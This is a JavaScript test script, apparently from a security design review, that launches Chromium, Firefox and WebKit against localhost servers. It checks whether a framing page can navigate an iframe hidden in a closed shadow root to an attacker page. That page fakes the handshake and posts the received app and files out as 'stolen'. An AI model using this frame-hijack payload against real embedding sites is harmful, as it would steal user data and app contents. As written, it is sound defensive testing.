// Probe 1 of review 2: can a page that frames the host page navigate the frame the element creates inside its closed
// shadow root (F, the served file) or the view inside it (C), before the host's start-up message, and so receive the
// start-up port, answer the handshake and receive the app?
//
// Model of design 03's start-up order, not the library: H (the host page, site B) holds a custom element with a closed
// shadow root and an <iframe sandbox="allow-scripts allow-forms" src="/file.html"> (F, served after DELAY ms, as a real
// network would). At F's load, H posts one port to F's frames[0]; on an answer carrying the expected hash and "passed",
// it sends the "app" and a second port, then a "call" with the user's state. T (site A) frames H and, as soon as H has
// a frame, navigates F (variant 'F') or C (variant 'C') to a page of its own whose child answers the handshake.
//
// Run: node p1-ancestor-navigation.mjs   (PLAYWRIGHT_BROWSERS_PATH set; under flock)
import http from 'node:http';
import { chromium, firefox, webkit } from 'playwright';

const DELAY = Number(process.env.DELAY ?? 800);
const HASH = 'sha256-LIBRARY-BOOTSTRAP';

const fileHtml = `<!doctype html><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'">
<iframe sandbox="allow-scripts allow-forms" srcdoc="<script>
onmessage = (e) => { if (e.source !== parent.parent) return; const p = e.ports[0];
  p.onmessage = (m) => { if (m.data.app) { m.ports[0].onmessage = (c) => {}; } };
  p.postMessage({ hash: '${HASH}', gates: 'passed', who: 'genuine C' }); };
</script>"></iframe>`;

const hostHtml = (hostCsp, shadow) => `<!doctype html>${hostCsp ? `<meta http-equiv="Content-Security-Policy" content="${hostCsp}">` : ''}
<script>const SHADOW = ${shadow};
const log = (x) => { parent.postMessage({ hostLog: x }, '*'); };
customElements.define('x-sandbox', class extends HTMLElement {
  connectedCallback() {
    const root = SHADOW ? this.attachShadow({ mode: 'closed' }) : this;
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', 'allow-scripts allow-forms');
    f.src = '/file.html';
    let loads = 0;
    f.addEventListener('load', () => {
      loads++;
      log('F load #' + loads + ', window.length in H = ' + window.length);
      if (loads > 1) return log('second load: would terminate');
      const c = f.contentWindow.frames[0];
      if (!c) return log('no frames[0] at load');
      const ch = new MessageChannel();
      ch.port1.onmessage = (e) => {
        log('handshake answer: ' + JSON.stringify(e.data));
        if (e.data.hash !== '${HASH}' || e.data.gates !== 'passed') return log('refused');
        const logic = new MessageChannel();
        logic.port1.onmessage = (m) => log('guest called host method: ' + JSON.stringify(m.data));
        ch.port1.postMessage({ app: { html: '<p>app</p>', files: { 'notes.txt': 'EMBEDDER-FILE' } } }, [logic.port2]);
        setTimeout(() => logic.port1.postMessage({ call: 'load', args: ['USER-STATE'] }), 100);
      };
      c.postMessage({ type: 'INIT' }, '*', [ch.port2]);
    });
    root.append(f);
  }
});
setTimeout(() => document.body.append(document.createElement('x-sandbox')), 300);
</script>`;

const evilHtml = `<!doctype html><iframe srcdoc="<script>
onmessage = (e) => { const p = e.ports[0]; if (!p) return;
  p.onmessage = (m) => { if (!m.data.app) return; top.postMessage({ stolen: m.data.app }, '*');
    const logic = m.ports[0];
    logic.onmessage = (c) => top.postMessage({ stolenCall: c.data }, '*');
    logic.postMessage({ method: 'save', args: ['ATTACKER-DATA'] }); };
  p.postMessage({ hash: '${HASH}', gates: 'passed', who: 'attacker' }); };
</script>"></iframe>`;

const topHtml = (hostOrigin, variant, shadow) => `<!doctype html><iframe id=h src="${hostOrigin}/host.html?shadow=${shadow}"></iframe>
<script>
const out = []; window.__out = out;
onmessage = (e) => out.push(e.data);
const h = document.getElementById('h');
const evil = location.origin + '/evil.html';
const tick = () => {
  try {
    const w = h.contentWindow;
    if (w.frames.length >= 1) {
      const target = '${variant}' === 'F' ? w.frames[0] : w.frames[0].frames[0];
      if (!target) return setTimeout(tick, 1);
      target.location.href = evil; out.push({ top: 'navigated ${variant}, frames.length=' + w.frames.length });
      return;
    }
  } catch (err) { out.push({ top: 'error: ' + err.message }); return; }
  setTimeout(tick, 1);
};
tick();
</script>`;

function serve(port, hostCsp) {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      const url = new URL(req.url, 'http://x');
      const send = (body) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end(body); };
      if (url.pathname === '/host.html') return send(hostHtml(hostCsp, url.searchParams.get('shadow') !== '0'));
      if (url.pathname === '/file.html') return setTimeout(() => send(fileHtml), DELAY);
      if (url.pathname === '/evil.html') return send(evilHtml);
      if (url.pathname === '/top.html') return send(topHtml(url.searchParams.get('host'), url.searchParams.get('v'), url.searchParams.get('shadow')));
      res.writeHead(404); res.end();
    });
    server.listen(port, '127.0.0.1', () => resolve(server));
  });
}

const A = 24811, B = 24812;
const results = [];
for (const hostCsp of [null, "frame-src 'self'"]) {
  const sa = await serve(A, hostCsp), sb = await serve(B, hostCsp);
  for (const [name, type] of [['chromium', chromium], ['firefox', firefox], ['webkit', webkit]]) {
    for (const [variant, shadow] of [['F', 1], ['C', 1], ['F', 0], ['C', 0]]) {
      const browser = await type.launch();
      const page = await browser.newPage();
      // T on localhost:A (site A), H on 127.0.0.1:B (site B): cross-site
      await page.goto(`http://localhost:${A}/top.html?host=${encodeURIComponent(`http://127.0.0.1:${B}`)}&v=${variant}&shadow=${shadow}`);
      await page.waitForTimeout(DELAY + 2500);
      const out = await page.evaluate(() => window.__out);
      results.push({ engine: name, hostCsp: hostCsp ?? '(none)', variant, shadow, out });
      await browser.close();
    }
  }
  sa.close(); sb.close();
}
for (const r of results) {
  console.log(`\n== ${r.engine} | host policy: ${r.hostCsp} | T navigates ${r.variant} | iframe in closed shadow root: ${r.shadow ? 'yes' : 'no (light DOM control)'}`);
  for (const o of r.out) console.log('  ' + JSON.stringify(o));
}
